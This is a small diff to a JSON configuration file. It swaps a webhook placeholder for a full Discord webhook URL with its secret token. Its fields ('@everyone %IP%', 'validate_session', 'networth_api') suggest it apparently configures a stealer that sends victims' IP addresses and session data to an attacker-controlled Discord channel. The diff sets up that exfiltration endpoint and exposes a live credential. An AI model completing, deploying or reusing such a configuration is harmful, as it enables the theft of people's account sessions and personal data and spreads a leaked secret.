@@ -1,5 +1,5 @@
 {
-  "webhook": "YOUR_WEBHOOK_URL_HERE",
+  "webhook": "https://discord.com/api/webhooks/1438748737831702688/1iY0iJXoKTnVZis04MsaXLt9eHHPJTfX4Ek0w5rep3O95XXp90JzrrYVuJq9rXP-j_5V",
   "webhook_name": "webhook",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
@@ -33,4 +33,5 @@
 
   "validate_session": true,
   "networth_api": ""
+
 }
